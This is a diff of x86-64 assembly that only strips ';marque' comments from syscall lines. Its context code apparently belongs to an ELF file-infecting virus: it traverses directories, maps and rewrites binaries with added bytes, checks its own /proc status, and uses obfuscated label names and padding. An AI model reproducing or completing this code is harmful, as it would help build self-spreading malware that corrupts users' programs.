@@ -371,7 +371,7 @@ enter 0, 0
 push rdi
 lea rdi, [rel rand_file]
 mov rsi, OPEN_FILE_PERMISSION
-SYS_NUM sys_open;marque
+SYS_NUM sys_open
 syscall
 padding
 cmp rax, 0
@@ -381,12 +381,12 @@ mov rdi, rax
 mov rsi, rsp
 mov rdx, 8
 push rax
-SYS_NUM sys_read;marque
+SYS_NUM sys_read
 syscall
 padding
 pop rax
 mov rdi, rax
-SYS_NUM sys_close;marque
+SYS_NUM sys_close
 syscall
 padding
 
@@ -448,7 +448,7 @@ inc r9
 sub r8, r9
 mov r9, r8
 inc r9
-SYS_NUM sys_mmap;marque
+SYS_NUM sys_mmap
 push r11
 syscall
 padding
@@ -530,7 +530,7 @@ add r13, rdx
 call vrbeiwuenofrvebre
 mov rdi, QWORD[r11 + elf_struc.path]
 mov rsi, 513
-SYS_NUM sys_open;marque
+SYS_NUM sys_open
 push r11
 syscall
 padding
@@ -541,7 +541,7 @@ jl ret_0
 mov rdi, rax
 mov rsi, QWORD[r11 + elf_struc.new_bin_addr]
 mov rdx, r13
-SYS_NUM sys_write;marque
+SYS_NUM sys_write
 push r11
 syscall
 padding
@@ -551,13 +551,13 @@ xor rsi, rsi
 sub rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
 neg rsi
 add rsi, QWORD[r11 + elf_struc.bits_added]
-SYS_NUM sys_munmap;marque
+SYS_NUM sys_munmap
 push r11
 syscall
 padding
 pop r11
 mov rdi, QWORD[r11 + elf_struc.fd2]
-SYS_NUM sys_close;marque
+SYS_NUM sys_close
 syscall
 padding
 jmp ret_1
@@ -646,7 +646,7 @@ enter 0, 0
 sub rsp, ELF_STRUC_SIZE
 mov QWORD[rsp + elf_struc.path], rdi
 
-SYS_NUM sys_lstat;marque
+SYS_NUM sys_lstat
 lea rsi, [rsp + elf_struc.stat]
 syscall
 padding
@@ -673,7 +673,7 @@ jne tyujhgdkbgpejc
 
 mov rdi, QWORD[rsp + elf_struc.path]
 mov rsi, OPEN_FILE_PERMISSION
-SYS_NUM sys_open;marque
+SYS_NUM sys_open
 syscall
 padding
 mov QWORD[rsp + elf_struc.fd], rax
@@ -690,7 +690,7 @@ mov r10, MAP_PRIVATE
 xor r8, r8
 mov r8, QWORD[rsp + elf_struc.fd]
 mov r9, 0
-SYS_NUM sys_mmap;marque
+SYS_NUM sys_mmap
 syscall
 padding
 mov QWORD[rsp + elf_struc.ptr], rax
@@ -703,13 +703,13 @@ call poiuyhnvfghnvjfrdei
 mov rdi, QWORD[rsp + elf_struc.ptr]
 xor rsi, rsi
 mov esi, DWORD[rsp + elf_struc.stat + stat.st_size]
-SYS_NUM sys_munmap;marque
+SYS_NUM sys_munmap
 syscall
 padding
 
 vufehibnoeierbn:
 mov edi, DWORD[rsp + elf_struc.fd]
-SYS_NUM sys_close;marque
+SYS_NUM sys_close
 syscall
 padding
 tyujhgdkbgpejc:
@@ -732,7 +732,7 @@ call porgeijtbhruvecwe
 
 lea rdi, [rbp - NAME_SIZE]
 mov rsi, OPEN_PROC_PERMISSION
-SYS_NUM sys_open;marque
+SYS_NUM sys_open
 syscall
 padding
 mov r10, rax
@@ -742,14 +742,14 @@ jl uyhnvremikn
 mov rdi, rax
 lea rsi, [rsp]
 mov rdx, CONTENT_SIZE
-SYS_NUM sys_read;marque
+SYS_NUM sys_read
 syscall
 padding
 mov byte[rsp + rax], 0
 cmp rax, 0
 jl uyhnvremikn
 
-SYS_NUM sys_close;marque
+SYS_NUM sys_close
 mov rdi, r10
 syscall
 padding
@@ -773,7 +773,7 @@ enter 0, 0
 sub rsp, DIRENT_SIZE + NAME_SIZE
 mov r13, rdi
 mov r10, rsi
-SYS_NUM sys_open;marque
+SYS_NUM sys_open
 mov rsi, OPEN_DIR_PERMISSION
 xor rdx, rdx
 syscall
@@ -785,7 +785,7 @@ cftgyhujkbitjrdq:
 mov rdi, r12
 lea rsi, [rsp]
 mov rdx, DIRENT_SIZE
-SYS_NUM sys_getdents;marque
+SYS_NUM sys_getdents
 syscall
 padding
 
@@ -840,7 +840,7 @@ jl dfghjvfieijaoflvg
 jmp cftgyhujkbitjrdq
 vbhnujivfebuo2:
 push r11
-SYS_NUM sys_close;marque
+SYS_NUM sys_close
 mov rdi, r12
 syscall
 pop r11
@@ -853,7 +853,7 @@ enter 0, 0
 sub rsp, NAME_SIZE + 8
 lea rdi, [rel self_status]
 mov rsi, OPEN_PROC_PERMISSION
-SYS_NUM sys_open;marque
+SYS_NUM sys_open
 syscall
 padding
 cmp rax, 0
@@ -862,7 +862,7 @@ jl ret_0
 mov rdi, rax
 lea rsi, [rsp + 8]
 mov rdx, NAME_SIZE
-SYS_NUM sys_read;marque
+SYS_NUM sys_read
 syscall
 padding
 mov rbx, rax
@@ -888,7 +888,7 @@ mov rax, 0
 qeftgvdusvdsbd:
 push rax
 mov rdi, QWORD[rsp + 8]
-SYS_NUM sys_close;marque
+SYS_NUM sys_close
 syscall
 padding
 pop rax
@@ -926,7 +926,7 @@ mov rdi, 0x2322a163f2fcad26
 mov rsi, 0x2322a163f2fcad26
 cmp rdi, rsi
 jne vuyfdhbisnqacu
-SYS_NUM sys_exit;marque
+SYS_NUM sys_exit
 xor rdi, rdi
 syscall
 vuyfdhbisnqacu:
